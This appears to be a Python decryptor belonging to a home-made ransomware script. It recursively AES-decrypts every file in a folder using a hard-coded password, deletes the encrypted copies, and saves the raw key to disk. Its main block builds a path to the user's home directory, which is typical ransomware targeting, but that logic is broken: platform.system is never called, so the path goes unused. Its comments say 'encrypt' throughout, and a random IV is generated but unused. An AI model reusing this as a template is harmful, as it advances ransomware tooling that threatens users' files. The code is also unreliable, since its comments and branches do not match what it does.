import os
import socket
import getpass
import platform
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import unpad

# Function to encrypt a file and removing the unencrypted one
def decrypt_file(file, key):
    enc_file = file
    with open(enc_file, 'rb') as f:
        iv = f.read(16)
        ciphertext = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    with open(enc_file[:-5], 'wb') as dec_file:
        dec_file.write(plaintext)

    os.remove(enc_file)

# This will go through the specified folder and encrypt all of the files, even from subfolders
def decrypt_whole(folder_path, password):
    key = hashlib.sha256(password.encode()).digest() 
    iv = get_random_bytes(16)

    for root, _, files in os.walk(folder_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)                                 
                decrypt_file(file_path, key)
                print(f"Decrypted: {file_path}")

    cwd = os.getcwd()
    with open("aes-key", "wb") as open_key:
        open_key.write(key)

# Main function
# Detects username, assembles path and calls function from above to encrypt
if __name__ == "__main__":
    username = getpass.getuser()
    path = ''
    
    if platform.system == "Windows":
        path = r'C:\Users\%s' % username
    elif platform.system == "Linux":
        path = '/home/' + username
    elif platform.system == "Darwin":
        path = '/Users/' + username
    
    decrypt_whole("/home/hellisabove/test", "hellisabove")
